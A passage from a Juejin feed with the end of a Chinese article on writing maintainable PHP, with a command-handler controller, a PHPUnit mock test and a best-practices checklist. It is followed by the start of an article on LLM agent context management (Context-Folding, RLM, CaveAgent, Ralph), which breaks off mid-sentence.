                    <span class="hljs-string">'productId'</span> =&gt; (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$it</span>[<span class="hljs-string">'product_id'</span>] ?? <span class="hljs-number">0</span>),
                    <span class="hljs-string">'qty'</span>       =&gt; (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$it</span>[<span class="hljs-string">'qty'</span>] ?? <span class="hljs-number">0</span>),
                ],
                <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$itemsRaw</span>) ? <span class="hljs-variable">$itemsRaw</span> : []
            );
            <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlaceOrderCommand</span>(
                userId: (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$request</span>[<span class="hljs-string">'user_id'</span>] ?? <span class="hljs-number">0</span>),
                items: <span class="hljs-variable">$items</span>
            );
            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;handler-&gt;<span class="hljs-title function_ invoke__">handle</span>(<span class="hljs-variable">$cmd</span>);
            <span class="hljs-keyword">return</span> [
                <span class="hljs-string">'ok'</span> =&gt; <span class="hljs-literal">true</span>,
                <span class="hljs-string">'order_id'</span> =&gt; <span class="hljs-variable">$result</span>-&gt;orderId,
                <span class="hljs-string">'total'</span> =&gt; <span class="hljs-variable">$result</span>-&gt;total,
            ];
        } <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">DomainException</span> <span class="hljs-variable">$e</span>) {
            <span class="hljs-keyword">return</span> [<span class="hljs-string">'ok'</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">'error'</span> =&gt; <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>()];
        } <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) {
            <span class="hljs-comment">// avoid leaking internals</span>
            <span class="hljs-keyword">return</span> [<span class="hljs-string">'ok'</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'Unexpected error'</span>];
        }
    }
}
</code></pre>
<p>这个版本不是"为了复杂而复杂"，而是把复杂度放到了该放的地方：</p>
<ul>
<li>业务规则集中管理</li>
<li>事务受控</li>
<li>控制器极简</li>
<li>依赖抽象化</li>
<li>终于可以写测试了</li>
</ul>
<p>而且这些全是原生 PHP，没用什么黑魔法。</p>
<h3 data-id="heading-8">测试：停止甩锅给语言的最快方式</h3>
<p>很多 PHP 团队不写测试，因为早年写起来确实别扭。但现在的 PHP 写测试已经很顺手了。</p>
<p>下面用一个简单的 PHPUnit 例子演示：通过 mock 仓储测试业务逻辑，完全不需要数据库。</p>
<h4 data-id="heading-9">✅ PHPUnit 风格的单元测试（无需数据库）</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);
<span class="hljs-keyword">use</span> <span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">TestCase</span>;
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PlaceOrderHandlerTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">TestCase</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_it_places_an_order_and_returns_total</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable">$tx</span> = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">TransactionManager</span> </span>{
            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"><span class="hljs-keyword">callable</span> <span class="hljs-variable">$fn</span></span>): <span class="hljs-title">mixed</span> </span>{ <span class="hljs-keyword">return</span> <span class="hljs-variable">$fn</span>(); }
        };
        <span class="hljs-variable">$users</span> = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserRepository</span> </span>{
            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getStatus</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$userId</span></span>): ?<span class="hljs-title">string</span> </span>{ <span class="hljs-keyword">return</span> <span class="hljs-string">'active'</span>; }
        };
        <span class="hljs-variable">$products</span> = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ProductRepository</span> </span>{
            <span class="hljs-keyword">private</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$stock</span> = [<span class="hljs-number">10</span> =&gt; <span class="hljs-number">5</span>];
            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSnapshot</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$productId</span></span>): ?<span class="hljs-title">ProductSnapshot</span> </span>{
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$productId</span> !== <span class="hljs-number">10</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductSnapshot</span>(<span class="hljs-number">10</span>, price: <span class="hljs-number">200</span>, stock: <span class="hljs-variable language_">$this</span>-&gt;stock[<span class="hljs-number">10</span>]);
            }
            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decreaseStock</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$productId</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$qty</span></span>): <span class="hljs-title">void</span> </span>{
                <span class="hljs-variable language_">$this</span>-&gt;stock[<span class="hljs-variable">$productId</span>] -= <span class="hljs-variable">$qty</span>;
            }
        };
        <span class="hljs-variable">$orders</span> = <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">OrderRepository</span> </span>{
            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$userId</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$total</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$lines</span></span>): <span class="hljs-title">int</span> </span>{ <span class="hljs-keyword">return</span> <span class="hljs-number">123</span>; }
        };
        <span class="hljs-variable">$handler</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlaceOrderHandler</span>(<span class="hljs-variable">$tx</span>, <span class="hljs-variable">$users</span>, <span class="hljs-variable">$products</span>, <span class="hljs-variable">$orders</span>);
        <span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlaceOrderCommand</span>(
            userId: <span class="hljs-number">7</span>,
            items: [
                [<span class="hljs-string">'productId'</span> =&gt; <span class="hljs-number">10</span>, <span class="hljs-string">'qty'</span> =&gt; <span class="hljs-number">2</span>],
            ]
        );
        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$handler</span>-&gt;<span class="hljs-title function_ invoke__">handle</span>(<span class="hljs-variable">$cmd</span>);
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">assertSame</span>(<span class="hljs-number">123</span>, <span class="hljs-variable">$result</span>-&gt;orderId);
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">assertSame</span>(<span class="hljs-number">400</span>, <span class="hljs-variable">$result</span>-&gt;total);
    }
}
</code></pre>
<p>如果你的用例能这样测试，"PHP 不可维护"这种话就很难再理直气壮地说出口了。可维护性不是语言自带的能力，是靠结构和测试撑起来的。</p>
<h3 data-id="heading-10">"框架神话"：Laravel/Symfony 不会自动拯救你</h3>
<p>框架有用，但它拦不住你写出烂架构。比如在 Laravel 里，你照样可以：</p>
<ul>
<li>写出臃肿的控制器</li>
<li>把领域逻辑全塞进 Eloquent 模型</li>
<li>因为觉得"绕了一层"而直接跳过服务层</li>
</ul>
<p>如果你见过控制器写了 800 行的 Laravel 项目，问题不在 Laravel，而在于团队把框架当成了不做设计的理由。</p>
<p>框架是工具箱。它能盖房子——也能堆一堆木头。</p>
<h3 data-id="heading-11">为什么 PHP 比其他技术栈更容易挨骂</h3>
<p>原因说起来有点微妙：在 PHP 里，糟糕的决策暴露得更快。</p>
<p>有些技术栈的抽象层能把烂代码盖住更长时间。但在 PHP 里，写得烂一眼就能看出来：</p>
<ul>
<li>职责混杂</li>
<li>约定不一致</li>
<li>复制粘贴的重复代码</li>
<li>隐蔽的全局变量</li>
<li>随意的错误处理</li>
</ul>
<p>PHP 不会替你兜底，所以它最容易被拎出来当靶子。</p>
<p>但一门逼你守规矩的语言不见得"更好"，它只是让你更难偷懒。PHP 把门槛放得很低——所以你的团队文化反而更重要。</p>
<h3 data-id="heading-12">"整洁的 PHP"很无聊——这是夸奖</h3>
<p>写得整洁的 PHP 代码，通常看起来平平无奇：</p>
<ul>
<li>命名清晰</li>
<li>函数短小</li>
<li>输入输出明确</li>
<li>错误处理可预测</li>
<li>依赖注入</li>
<li>尽量少的魔法</li>
</ul>
<p>它不炫技，不追求巧妙。</p>
<p>无聊的代码在凌晨两点容易调试。无聊的代码容易交给新同事。无聊的代码在团队扩张时能扛得住。</p>
<p>如果你希望 PHP 不再被当笑话，那就写无聊的 PHP。</p>
<h3 data-id="heading-13">实操清单：如何停止写"被人骂"的 PHP</h3>
<p>如果你想写出不被人嘲笑的 PHP 系统，下面是一份实用的底线清单：</p>
<ul>
<li><strong>在新代码中开启严格类型</strong>：<code>declare(strict_types=1);</code></li>
<li><strong>所有依赖通过 Composer 和自动加载管理</strong>，不要手动 include。</li>
<li><strong>保持控制器轻薄</strong>（只处理 HTTP），业务规则放到 handler/service 中。</li>
<li><strong>领域规则和持久化分离</strong>，仓储或查询服务能保持数据访问的一致性。</li>
<li><strong>使用显式的 DTO 传递请求和命令</strong>，不要到处传裸数组。</li>
<li><strong>区分领域错误和系统错误</strong>，不是每个异常都该是 500。</li>
<li><strong>在用例层添加单元测试</strong>，如果业务逻辑离了数据库就没法测，说明你的边界划错了。</li>
<li><strong>使用静态分析工具</strong>（PHPStan/Psalm）防止隐性回归。</li>
<li><strong>引入代码风格工具并在 CI 中强制执行</strong>，一致性很重要。</li>
<li><strong>持续重构</strong>，如果重构变成了"一个项目"，那它永远不会发生。</li>
</ul>
<p>以上这些不是 PHP 独有的——恰恰相反，放到哪个语言都一样。</p>
<h3 data-id="heading-14">结语：PHP 是一面镜子——别砸镜子</h3>
<p>PHP 不完美，没有语言是完美的。但用 PHP 遇到的大部分痛苦不是语言造成的，而是写法造成的：赶工、职责混杂、边界模糊、"以后再改"的文化。</p>
<p>一个 PHP 项目变得不可收拾的时候，很少是因为 PHP 撑不起好架构，而是从来没人把架构当回事。</p>
<p>PHP 是一面镜子：</p>
<ul>
<li>如果你有纪律，它看起来很专业。</li>
<li>如果你很随意，它看起来很混乱。</li>
<li>如果你在持续的赶工压力下没有质量标准，它看起来就像战场。</li>
</ul>
<p>所以下次有人说"都怪 PHP"的时候，你可以反问一句：</p>
<p><strong>是 PHP 的问题……还是我们流程的问题？</strong></p>
<p>因为代码不是语言自己写的。</p>
<p>是你写的。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-02%2Fphp-problem-isnt-language" target="_blank" title="https://catchadmin.com/post/2026-02/php-problem-isnt-language" ref="nofollow noopener noreferrer">PHP 的问题不在语言本身，而在我们怎么写它 </a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[解密Prompt系列69. 从上下文管理到Runtime操作系统]]></title>    <link>https://juejin.cn/post/7605539194690486272</link>    <guid>https://juejin.cn/post/7605539194690486272</guid>    <pubDate>2026-02-12T23:45:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605539194690486272" data-draft-id="7605539194690469888" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="解密Prompt系列69. 从上下文管理到Runtime操作系统"/> <meta itemprop="keywords" content="人工智能,LLM"/> <meta itemprop="datePublished" content="2026-02-12T23:45:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风雨中的小七"/> <meta itemprop="url" content="https://juejin.cn/user/3060648218472728"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            解密Prompt系列69. 从上下文管理到Runtime操作系统
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3060648218472728/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风雨中的小七
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T23:45:06.000Z" title="Thu Feb 12 2026 23:45:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 LLM 发展的上半场，我们执着于不断拉长 Context Window，从 8K 到 128K 甚至百万级别。但在下半场，资深开发者们逐渐意识到：盲目拉长上下文是在用昂贵的算力掩盖逻辑管理的无能为例。 这一章我们围绕<strong>Coding</strong>这个核心视角来寻找一些新的上下文管理的思路：<strong>以 Coding 为核心，将 Context 视为“内存（RAM）”，将 Runtime 视为“状态（State）”，构建一套属于智能体的“操作系统”。</strong></p>
<p>最近，ByteDance 的 Context-Folding、MIT 的 RLM、以及热门项目 Ralph 的出现，共同指向了一个极其明确的趋势：未来的智能体不再是“文本生成器”，而是Stateful Runtime Operator。</p>
<p>这一章我们不精读论文，而是围绕coding的上下文管理，分别看下以下论文中相关的点。</p>
<h2 data-id="heading-0">内存折叠：上下文的“分级治理”与垃圾回收</h2>
<blockquote>
<ul>
<li>Scaling Long-Horizon LLM Agent via Context-Folding</li>
</ul>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c2ede27905d445aaf1f8ca82669f372~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO6Zuo5Lit55qE5bCP5LiD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771544706&amp;x-signature=D9rrvC8g5RZf%2FguGowCM6NvhGmk%3D" alt="image" loading="lazy"/>
在长程任务（如 Deep Research 或全库代码修改）中，Agent 会产生海量的中间工具调用日志。传统的做法是全量堆叠，但这会导致上下文迅速“通胀”。</p>
<ol>
<li>核心工程实现：Branch &amp; Return
字节的方案非常 Native 地借鉴了 Git 分支管理的概念：</li>
</ol>
<ul>
<li>Branch(description, prompt)：创建一个子分支，开启子任务，此时所有的中间逻辑（搜索结果、读取的长文件）仅在子分支内流转。</li>
<li>Return(message)：子任务结束，物理删除子分支内所有过程 Token，仅将精炼后的执行结果 merge 回主分支。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a01f5b836e7c4a13975012e717cdad8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO6Zuo5Lit55qE5bCP5LiD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771544706&amp;x-signature=VK5EP2dWZJw8WkyHO9vP0s0jW8k%3D" alt="image" loading="lazy"/></p>
<p>这里字节是使用了GRPO来通过训练优化模型调用Branch和Return工具的准确程度，不过这个折叠的思路其实是可以通过工具描述结合Git的相关操作来实现。</p>
<p>近期Claude 2.1的最新迭代中，SKILLS已经支持了fork功能，让SKILLS在隔离的上下文中运行，不会污染外层会话。所以在当前这个阶段，大家的想法都趋于一致性~</p>
<h2 data-id="heading-1">RLM：把上下文当作“外部存储”的渐进式加载</h2>
<blockquote>
<ul>
<li>RECURSIVE LANGUAGE MODELS</li>
</ul>
</blockquote>
<p>RLM 的思路与数据预处理中的“渐进式加载”如出一辙：当内存（Context Window）装不下超大文件（Long Prompt）时，不要强行负载，而是通过编程手段分片处理。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/542cd8a31ed948d28ba127437db43049~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO6Zuo5Lit55qE5bCP5LiD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771544706&amp;x-signature=ouoDiajU9qSPrNbHtedo9Y0AkJo%3D" alt="image" loading="lazy"/></p>
<ol>
<li><strong>核心范式：上下文即变量</strong>
RLM 将提示词加载为 Python REPL 环境中的全局变量 ctx。模型不再是“阅读”指令，而是通过以下操作“操控”指令：</li>
</ol>
<ul>
<li>Probe：通过 print(ctx[:500]) 观察指令局部。</li>
<li>Split &amp; Loop：根据关键词分割指令，并进行循环递归。</li>
<li>Regex：利用正则精准定位关键信息。</li>
<li>llm_query：这是论文中很有意思的一个点（哈哈虽然我对效果存疑）——在代码环境中反向暴露大模型能力，实现“模型嵌套代码，代码调用模型”。</li>
</ul>
<p>这里对比Context-Folding在每个branch开始还需要主Branch向子branch发送全部信息，而RLM只需要通过全局的变量持久化，就可以实现主要信息的直接传递，无需大量显式的信息传递。</p>
<p>这里就有两个点感觉有试验下的价值</p>
<ul>
<li><strong>通过持久化变量传递信息</strong>：不过需要注意的是通过print打印变量的关键信息，因为coding是不随多轮对话传递的，因此需要在观测中暴露必要信息，这一点其实是不稳定的根源</li>
<li><strong>在code环境中引入模型操作</strong>: 使用例如RLM定义的llm_query这个函数，在代码工具中反向暴露大模型操作，从而把简单的代码工具，进一步拓展成拥有模型能力的独立子智能体</li>
</ul>
<p>使用GPT5的完整指令如下，仅参考思路，个人更倾向从工具角度去做结合（还是要顺着模型native能力的发展方向去做）~</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57710cf45a9549d09bb04f10e98514ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO6Zuo5Lit55qE5bCP5LiD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771544706&amp;x-signature=twP4NYrf0De4E7tf2vnexudS9zw%3D" alt="image" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/874e92a1e87e409794831409354fe94f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO6Zuo5Lit55qE5bCP5LiD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771544706&amp;x-signature=AUahJMVpY%2Fac%2FTr4om6RjQvXFos%3D" alt="image" loading="lazy"/></p>
<h2 data-id="heading-2">CaveAgent：双流架构下的“状态化”运行时</h2>
<blockquote>
<ul>
<li>CaveAgent: Transforming LLMs into Stateful Runtime Operators</li>
</ul>
</blockquote>
<p>CaveAgent 进一步强化了“变量即记忆”的思路。它提出 LLM 应该在两个流中切换：</p>
<p><strong>1. Dual-stream Architecture</strong></p>
<ul>
<li>Semantic Stream（语义流）：轻量级推理上下文，仅记录“想了什么”。</li>
<li>Runtime Stream（运行时流）：持久化的 Python 环境，记录“存了什么”。模型直接操作外部变量的“句柄（Handle）”而不是内容。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10086de7040d4d25904fe4a8cb196380~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO6Zuo5Lit55qE5bCP5LiD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771544706&amp;x-signature=2JhntFPWS2EloNh%2BukHySedkUPc%3D" alt="image" loading="lazy"/></p>
<p><strong>2. 深度思考：变量 vs. 文件</strong>
Manus之前在上下文管理中推崇以文件作为持久化介质，但变量存储在某些场景下更有优势：</p>
<ul>
<li><strong>更细粒度的观测</strong>：利用 df.describe() 或 obj.<strong>dict</strong> 可以生成比文件读取更精炼、结构化的信息观测（State Observation），这比 RAG 检索文件片段更精准。</li>
<li><strong>运行时一致性</strong>：变量支持条件筛选、动态更新（例如 Plan 结构体），每完成一步，将 is_finish 置为 True，实现原生的状态跟踪。</li>
</ul>
<p>可以当前看变量最大的问题在于观测信息的局部化，和文件所见即所得存在差异，如何更全面完整精简的描述变量是一个值得思考的问题。</p>
<h2 data-id="heading-3">Ralph</h2>
<blockquote>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fghuntley.com%2Fralph%2F" target="_blank" title="https://ghuntley.com/ralph/" ref="nofollow noopener noreferrer">ghuntley.com/ralph/</a></li>
</ul>
</blockquote>
<p>Ralph 项目最近在社区极火，它的名字“Repeatedly running agent in a loop”揭示了它的本质：通过“上下文彻底重置”来保证长程任务不崩溃。</p>
<p>整个智能体的执行链路，在指令里面有比较清晰的描述</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## Your Task</span>
<span class="hljs-bullet">1.</span> Read the PRD at <span class="hljs-code">`prd.json`</span> (in the same directory as this file)
<span class="hljs-bullet">2.</span> Read the progress log at <span class="hljs-code">`progress.txt`</span> (check Codebase Patterns section first)
<span class="hljs-bullet">3.</span> Check you're on the correct branch from PRD <span class="hljs-code">`branchName`</span>. If not, check it out or create from main.
<span class="hljs-bullet">4.</span> Pick the <span class="hljs-strong">**highest priority**</span> user story where <span class="hljs-code">`passes: false`</span>
<span class="hljs-bullet">5.</span> Implement that single user story
<span class="hljs-bullet">6.</span> Run quality checks (e.g., typecheck, lint, test - use whatever your project requires)
<span class="hljs-bullet">7.</span> Update AGENTS.md files if you discover reusable patterns (see below)
<span class="hljs-bullet">8.</span> If checks pass, commit ALL changes with message: <span class="hljs-code">`feat: [Story ID] - [Story Title]`</span>
<span class="hljs-bullet">9.</span> Update the PRD to set <span class="hljs-code">`passes: true`</span> for the completed story
<span class="hljs-bullet">10.</span> Append your progress to <span class="hljs-code">`progress.txt`</span>
</code></pre>
<p><strong>1. 以代码执行为核心的plan &amp; Execute</strong></p>
<ol>
<li>Plan环节
这一步其实和大家常用的Plan类似，Ralph选择JSON文件进行步骤管理。Anthropic也采用了相似的思路，认为JSON比Markdown模型进行乱改的概率更小。Raphal把生成Plan的过程拆分成了两个步骤，分别用SKILLS来实现</li>
</ol>
<ul>
<li>生成markdown格式的PRD文档：根据用户需求，可以适当追问明确细节，然后生成对应格式的PRD文件。两个核心要求
<ul>
<li>单个step要足够原子化（保证上文长度可以足够完成任务），但实际上这只是美好的愿望，依旧需要后处理压缩逻辑来100%保证</li>
<li>具体可衡量的验收标准：通过lint、test、browser verify进行明确验收反馈</li>
</ul>
</li>
</ul>
<ol start="2">
<li>Execute环节
执行步骤，会循环以上PRD.json的所有步骤，按顺序进行执行，每个Step执行是Bash里面全新的一次智能体循环，所以拥有全新的上下文，但是引入了<strong>经验压缩步骤</strong></li>
</ol>
<ul>
<li>progress.txt：基于前面执行步骤的重要观测，核心包括已完成功能、文件修改、以及后面执行任务可以借鉴的经验</li>
<li>Agents.md: 把整个项目可复用的编码经验，在每次执行完成以后，更新到Agents.md。其实在前面的progerss.txt已经有一轮<strong>经验反思和压缩</strong>。所以其实这里是两种不同等级的经验提取，不过感觉指令里面区分的并不算很清晰。可以进一步分成Project Specific和Engineer Specific可能会更加清晰。</li>
</ul>
<p>一个多步循环的Demo如下图所示
